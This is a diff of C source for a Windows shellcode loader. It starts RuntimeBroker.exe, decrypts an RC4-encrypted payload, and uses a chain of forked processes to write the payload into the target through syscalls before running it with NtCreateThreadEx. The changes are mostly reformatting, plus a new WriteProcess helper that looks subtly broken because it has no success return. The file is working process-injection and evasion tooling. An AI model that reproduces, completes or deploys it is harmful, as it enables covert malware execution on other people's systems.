@@ -33,11 +33,11 @@ BOOL CreateProcessViaWinAPIsA(IN LPCSTR cProcessImgNameAndParms, OUT PPROCESS_IN
 	if (!cProcessImgNameAndParms || !pProcessInfo)
 		return FALSE;
 
-	STARTUPINFO		StartupInfo		= { .cb = sizeof(STARTUPINFO) };
-	DWORD			dwCreationFlags		= NORMAL_PRIORITY_CLASS;
-	PCHAR			pcDuplicateStr		= NULL,
-				pcLastSlash		= NULL;
-	
+	STARTUPINFO		StartupInfo = { .cb = sizeof(STARTUPINFO) };
+	DWORD			dwCreationFlags = NORMAL_PRIORITY_CLASS;
+	PCHAR			pcDuplicateStr = NULL,
+		pcLastSlash = NULL;
+
 	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));
 
 	if (!(pcDuplicateStr = _strdup(cProcessImgNameAndParms))) {
@@ -71,13 +71,13 @@ BOOL Fork(IN LPCSTR cProcessParms) {
 	if (!cProcessParms)
 		return FALSE;
 
-	STARTUPINFO			StartupInfo				= { .cb = sizeof(STARTUPINFO) };
-	PROCESS_INFORMATION		ProcessInfo				= { 0x00 };
-	CHAR				cFileName[MAX_PATH]			= { 0x00 };
-	CHAR				cProcImgNameAndParms[MAX_PATH * 2]	= { 0x00 };
-	PCHAR				pcDuplicateStr				= NULL,
-					pcLastSlash				= NULL;
-	BOOL				bResult					= FALSE;
+	STARTUPINFO			StartupInfo = { .cb = sizeof(STARTUPINFO) };
+	PROCESS_INFORMATION		ProcessInfo = { 0x00 };
+	CHAR				cFileName[MAX_PATH] = { 0x00 };
+	CHAR				cProcImgNameAndParms[MAX_PATH * 2] = { 0x00 };
+	PCHAR				pcDuplicateStr = NULL,
+		pcLastSlash = NULL;
+	BOOL				bResult = FALSE;
 
 	RtlSecureZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
 
@@ -146,10 +146,10 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTR
 
 BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pShellcode, IN DWORD dwShellcodeSize, IN PBYTE pRc4Key, IN DWORD dwRc4KeySize) {
 
-	NTSTATUS			STATUS			= NULL;
-	fnSystemFunction032 		SystemFunction032	= NULL;
-	USTRING				Buffer			= { .Buffer = pShellcode,	.Length = dwShellcodeSize,	.MaximumLength = dwShellcodeSize };
-	USTRING				Key			= { .Buffer = pRc4Key,		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize };
+	NTSTATUS			STATUS = NULL;
+	fnSystemFunction032 		SystemFunction032 = NULL;
+	USTRING				Buffer = { .Buffer = pShellcode,	.Length = dwShellcodeSize,	.MaximumLength = dwShellcodeSize };
+	USTRING				Key = { .Buffer = pRc4Key,		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize };
 
 	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryW(L"Advapi32"), "SystemFunction032"))) {
 		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
@@ -209,18 +209,27 @@ int LoadStuffFromDisk(const char* fileName, void* data) {
 //---------------------------------------------------------------------------------------------------------------------------------
 //---------------------------------------------------------------------------------------------------------------------------------
 
+BOOL WriteProcess(IN HANDLE hProcess, IN PVOID uBaseAddress, IN PVOID pPayload, IN SIZE_T sPayloadSize) {
+	DWORD sNumberOfBytesWritten = 0;
+	SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
+	if ((STATUS = RunSyscall(hProcess, uBaseAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)) || 1024 != sNumberOfBytesWritten) {
+		printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
+		printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
+		return FALSE;
+	}
+}
 
 int main(int argc, char* argv[]) {
 
-	CHAR					cTargetProcName[MAX_PATH]	= "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";
-	CHAR					cLocalProcParms[MAX_PATH]	= { 0x00 };
-	PROCESS_INFORMATION			ProcessInfo			= { 0x00 };
-	HANDLE					hTargetProcess			= NULL,
-						hThread				= NULL;
-	ULONG_PTR				uBaseAddress			= NULL;
-	DWORD					dwOldProtection			= 0x00,
-						dwThreadId			= 0x00;
-	SIZE_T					sNumberOfBytesWritten		= NULL;
+	CHAR					cTargetProcName[MAX_PATH] = "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";
+	CHAR					cLocalProcParms[MAX_PATH] = { 0x00 };
+	PROCESS_INFORMATION			ProcessInfo = { 0x00 };
+	HANDLE					hTargetProcess = NULL,
+		hThread = NULL;
+	ULONG_PTR				uBaseAddress = NULL;
+	DWORD					dwOldProtection = 0x00,
+		dwThreadId = 0x00;
+	SIZE_T					sNumberOfBytesWritten = NULL;
 	SIZE_T				pRc4Encrypt = sizeof(Rc4EncData);
 
 	SIZE_T				sizeOfBuffer = 1024;
@@ -246,12 +255,12 @@ int main(int argc, char* argv[]) {
 
 		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());
 
-		if (!CreateProcessViaWinAPIsA(cTargetProcName, &ProcessInfo)) 
+		if (!CreateProcessViaWinAPIsA(cTargetProcName, &ProcessInfo))
 			return -1;
 
 		if (!(hTargetProcess = ProcessInfo.hProcess))
 			return -1;
-		
+
 		// Duplicate Handle To Child Processes
 		if (!SetHandleInformation(hTargetProcess, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
 			printf("[!] SetHandleInformation Failed with Error: %d \n", GetLastError());
@@ -267,9 +276,9 @@ int main(int argc, char* argv[]) {
 		if (!Fork(cLocalProcParms))
 			return -1;
 	}
-	
+
 	if (argc == 2) {
-		
+
 		// Allocate Memory
 
 		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());
@@ -284,12 +293,15 @@ int main(int argc, char* argv[]) {
 			return -1;
 		}
 
+
+
+
 		/*if (!(uBaseAddress = VirtualAllocEx((HANDLE)hTargetProcess, NULL, sizeof(Rc4EncData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
 			printf("[!] VirtualAllocEx Failed with Error: %d \n", GetLastError());
 			return -1;
 		}*/
 
-		printf("[%d] Allocated Memory At: 0x%p \n", argc, (PVOID)uBaseAddress);
+
 
 		sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p", argv[1], (PVOID)uBaseAddress);
 
@@ -302,16 +314,18 @@ int main(int argc, char* argv[]) {
 	if (argc == 3) {
 
 		// RWX
-		
+
 		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());
 
-		uBaseAddress	= (ULONG_PTR)ConvertStringToPtr(argv[2]);
-		hTargetProcess	= (HANDLE)ConvertStringToPtr(argv[1]);
+		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
+		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);
 
 		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
 		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);
 
-	
+
+
+
 		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
 		if ((STATUS = RunSyscall(hTargetProcess, &uBaseAddress, &pRc4Encrypt, PAGE_EXECUTE_READ, &dwOldProtection)) != 0x00) {
 			printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
@@ -339,14 +353,14 @@ int main(int argc, char* argv[]) {
 
 		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());
 
-		uBaseAddress	= (ULONG_PTR)ConvertStringToPtr(argv[2]);
-		hTargetProcess	= (HANDLE)ConvertStringToPtr(argv[1]);
+		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
+		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);
 
 		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
 		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);
 
-		DWORD		dwWriteProcesses	= sizeof(Rc4EncData) / 1024,
-				dwCurrentProcess	= 0x00;
+		DWORD		dwWriteProcesses = sizeof(Rc4EncData) / 1024,
+			dwCurrentProcess = 0x00;
 
 		if (!Rc4EncryptionViaSystemFunc032(Rc4EncData, sizeof(Rc4EncData), Rc4Key, sizeof(Rc4Key))) {
 			printf("[!] Failed To Decrypt Payload: %d\n", __LINE__);
@@ -354,23 +368,22 @@ int main(int argc, char* argv[]) {
 		}
 
 		//printf("[+] Syscall Number Of NtWriteVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
-		/*SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
-		if ((STATUS = RunSyscall(hTargetProcess, uBaseAddress, pRc4EncData, 1024, &sNumberOfBytesWritten)) != 0x00) {
-			printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
-			return FALSE;
-		}*/
+		WriteProcess(hTargetProcess, uBaseAddress, Rc4EncData, 1024);
+
 
 		// Rc4EncData is now plaintext payload
 
-		if (!WriteProcessMemory(hTargetProcess, uBaseAddress, Rc4EncData, 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
+		//printf("[+] --------- Allocated Memory At: 0x%p \n", argc, (PVOID)uBaseAddress);
+
+		/*if (!WriteProcessMemory(hTargetProcess, uBaseAddress, Rc4EncData, 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
 			printf("[!] WriteProcessMemory Failed with Error: %d \n", GetLastError());
 			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
 			return -1;
-		}
+		}*/
 
 		// Increment Write Process Number
 		dwCurrentProcess++;
-		
+
 		sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p %d %d", argv[1], (PVOID)uBaseAddress, 0x100, dwCurrentProcess);
 
 		// Fork With Target Process Handle & Base Address & dummy arg & current process number
@@ -386,14 +399,14 @@ int main(int argc, char* argv[]) {
 
 		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());
 
-		uBaseAddress	= (ULONG_PTR)ConvertStringToPtr(argv[2]);
-		hTargetProcess	= (HANDLE)ConvertStringToPtr(argv[1]);
+		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
+		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);
 
 		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
 		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);
 
 		DWORD		dwWriteProcesses = sizeof(Rc4EncData) / 1024,
-				dwCurrentProcess = atoi(argv[4]);
+			dwCurrentProcess = atoi(argv[4]);
 
 		printf("[%d] Current Process Number: %d \n", argc, dwCurrentProcess);
 
@@ -425,20 +438,20 @@ int main(int argc, char* argv[]) {
 			sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p %d %d", argv[1], (PVOID)uBaseAddress, 0x100, dwCurrentProcess);	// argc == 5 (again)
 
 		Sleep(100); // x80 (payload size / 1024) * 100ms = 8s
-		
+
 		if (!Fork(cLocalProcParms))
 			return -1;
 	}
-	
+
 
 	if (argc == 6) {
 
 		// Execute
-		
+
 		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());
 
-		uBaseAddress	= (ULONG_PTR)ConvertStringToPtr(argv[2]);
-		hTargetProcess	= (HANDLE)ConvertStringToPtr(argv[1]);
+		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
+		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);
 
 		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
 		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);
@@ -448,7 +461,7 @@ int main(int argc, char* argv[]) {
 		printf("[+] DONE \n");
 
 		SET_SYSCALL(g_Nt.NtCreateThreadEx);
-		if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hTargetProcess, uBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00){
+		if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hTargetProcess, uBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
 			return FALSE;
 		}
 
@@ -466,8 +479,8 @@ int main(int argc, char* argv[]) {
 	if (hThread)
 		CloseHandle(hThread);
 	if (hTargetProcess)
-		CloseHandle(hTargetProcess); 
-	
-	return 0;	
+		CloseHandle(hTargetProcess);
+
+	return 0;
 }
 
